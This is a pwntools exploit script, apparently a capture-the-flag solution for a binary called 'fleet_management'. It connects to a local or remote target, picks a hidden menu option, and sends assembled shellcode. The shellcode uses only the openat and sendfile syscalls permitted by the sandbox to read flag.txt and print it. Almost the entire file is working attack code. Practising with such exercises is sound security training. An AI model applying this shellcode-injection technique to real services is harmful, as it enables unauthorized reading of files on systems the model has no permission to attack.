#!/usr/bin/env python3

from pwn import *

e = ELF("./fleet_management_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(beta_feature+0x5f)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The program allows following syscalls:
    #   0x3c    (60)	exit
    #   0xe7    (231)	exit_group
    #   0x101   (257)	openat
    #   0x28    (40)	sendfile
    #   0xf     (15)	rt_sigreturn

    # Check https://filippo.io/linux-syscall-table/ about the conventioin for these syscalls.
    info('To check if pwntools shellcraft contains sendfile, try `pwn shellcraft -l amd64.linux`')
    info('To check the function arguments, try `help(shellcraft.sendfile)`')
    r.sendlineafter(b'do?', b'9')
    payload = flat(
            asm(shellcraft.openat('AT_FDCWD','flag.txt','O_RDONLY')),
            asm(shellcraft.sendfile(1, 'rax', 0, 0x40)),
            )
    info(f'stage 1 stage_1 has length {len(payload)}')
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
